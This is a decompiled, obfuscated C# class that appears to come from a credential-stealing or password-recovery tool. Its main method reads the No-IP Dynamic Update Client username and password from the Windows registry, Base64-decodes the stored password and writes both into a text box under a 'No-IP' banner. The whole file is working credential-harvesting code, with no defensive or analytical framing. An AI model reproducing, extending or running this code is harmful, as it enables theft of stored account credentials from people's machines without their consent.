using System;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns3;

internal sealed class Class15
{
	public static string smethod_0(string string_0)
	{
		string result = default(string);
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(string_0);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[checked(charCount - 1 + 1)];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			string text = new string(array2);
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_1()
	{
		string result = default(string);
		try
		{
			result = null;
			string text = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object)null));
			string string_ = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object)null));
			string text2 = "\r\n";
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("============No-IP==============");
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("Username: " + text);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("Password: " + smethod_0(string_));
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("=============================");
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text2);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text3 = "\r\n";
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text3);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("============No-IP==============");
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text3);
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText("No-IP Not Installed!");
			((TextBoxBase)Class1.smethod_2().method_0().vmethod_14()).AppendText(text3);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
